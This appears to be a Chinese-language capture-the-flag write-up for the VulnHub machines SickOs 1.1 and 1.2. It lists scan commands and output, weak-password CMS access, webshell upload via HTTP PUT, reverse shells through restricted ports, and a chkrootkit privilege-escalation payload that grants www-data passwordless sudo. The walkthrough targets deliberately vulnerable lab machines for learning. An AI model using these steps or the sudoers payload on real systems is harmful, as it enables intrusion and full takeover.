SickOs 1.1&1.2

SickOs 1.1（cms漏洞，代理访问、没啥看的，建议直接1.2）

下载地址：

https://download.vulnhub.com/sickos/sick0s1.1.7z

环境准备（开发者推荐使用vmware打开）：

靶机使用Vmware（桥接）运行，攻击机kali

首先使用netdiscover进行局域网扫描，发现靶机IP为192.168.0.103

netdiscover -i eth0 -r 192.168.0.0/24


直接访问ip地址是无法访问的，扫描端口结果如下。

扫描出的3128端口开了一个 squid 服务。

PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
3128/tcp open   http-proxy Squid http proxy 3.1.19
8080/tcp closed http-proxy
MAC Address: 00:0C:29:3E:05:A3 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


squid 是一个流行的代理与web缓存服务器，它接收访问者的请求，并将请求转发给真正的服务器；同时作为缓存服务器，有着提高web界面访问速度的作用

访问靶机页面需要先将请求发送到squid。

随后使用 dirsearch 扫描目录

python3 dirsearch.py -u http://192.168.0.103/ -w /home/kali/dirsearch/db/dicc.txt --proxy http://192.168.0.103:3128/

扫描结果：
[14:43:12] 200 -   21B  - /index.php
[14:43:12] 200 -   21B  - /index
[14:43:12] 200 -   21B  - /index.php/login/
[14:43:19] 200 -   45B  - /robots.txt


访问robots.txt发现了靶机的cms目录。

http://192.168.0.103/wolfcms/


查询一下此cms的漏洞，发现并无能直接获得shell的洞。那么试试弱口令

账号：admin、密码admin（靶机有点小bug，密码对了也不跳转到后台界面。多试几次就好了）.进入后台界面之后直接无限制上传文件

给shell工具设置代理后成功获得shell，并在cms的配置文件中找到了数据库的账号密码。

老样子，直接试试能不能登录用户。目标账号为uid为1000的sickos

成功以sickos用户身份登录并拿到flag。


总结收获：

了解到了一个新的应用漏洞，让之前一直不愿尝试弱口令的我（菜鸡）加深了对弱口令的重视。除此以外没别的了

SickOs 1.2（限制端口的反弹shell，chkrootkit提权，PUT方法）

下载地址：

https://download.vulnhub.com/sickos/sick0s1.2.zip

环境准备（开发者推荐使用vmware打开）：

靶机使用Vmware（桥接）运行，攻击机kali

netdiscover进行网络发现，靶机为网卡是vm inc 的192.168.0.101

扫描端口发现只开放80、22端口

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    lighttpd 1.4.28
MAC Address: 00:0C:29:26:13:24 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


80端口：

只有一张图片

![image.png]

扫目录没有什么重要的发现，index/login与初始页面无差别。并且所有的页面均无js代码

其中test目录内容如下，再一次提醒了界面由lighthttpd搭建。

[14:30:10] Starting: 
[14:30:24] 200 -  163B  - /index.php
[14:30:24] 200 -  163B  - /index.php/login/
[14:30:34] 200 -    1KB - /test/


既然从端口和目录没有发现，那么把思路放在light httpd上。

经exploit-db搜索发现并没有匹配的版本poc，思路在此时陷入了僵局

弱口令尝试失败

使用Curl探测页面支持的请求方法。 一般 -X 用来指定请求的方法，所以在这里使用 OPTIONS 请求来探测指定的URL在请求响应过程中支持的功能选项

curl http://192.168.0.101/test -X OPTIONS -vvv


通过 OPTIONS 的响应包可以看到，对方服务器支持有 PUT 方法。那么就可以使用 PUT 方法向服务器上放置资源

通过PUT方法上传木马，但是不知道是什么原因导致无法反连shell


最后通过使用一句话木马成功拿到shell

后面又经过尝试，发现将反弹shell的端口换到 443、8080等都可以成功。预计是防火墙限制了开放的端口。


有了反弹的shell之后我们使用定时任务提权

老样子：
 python -c 'import pty;pty.spawn("/bin/bash")'

查看当前定时任务：
  ls /etc/cron.daily
     cron目录中储存的是被规定定时执行的脚本


值得注意的是其中有一个名为 chkrootkit 的任务，这是一个检测rootkit木马后门的软件。值得注意的是，虽然它是一个安全防护软件，但是其本身却存在某种漏洞


查看chkrootkit软件版本。经查阅资料发现，0.49版本存在提权漏洞

chkrootkit -V


searchsploit chkrootkit


下面直接放上payload

1 · “chmod +w /etc/sudoers && echo “www-data ALL=(ALL)NOPASSWD:ALL” >> /etc/sudoers”
  将上述内容写进tmp下的update文件（需要自己创建）
2 · chmod a+x update


成功进入root目录拿到flag

另一种方法就是用msf连反弹shell，直接使用内置payload提权

总结：
  知道了探测页面允许的请求方法这一渗透点；接触到了有防火墙限制端口的反弹shell操作；接触到了chkrootkit版本提权
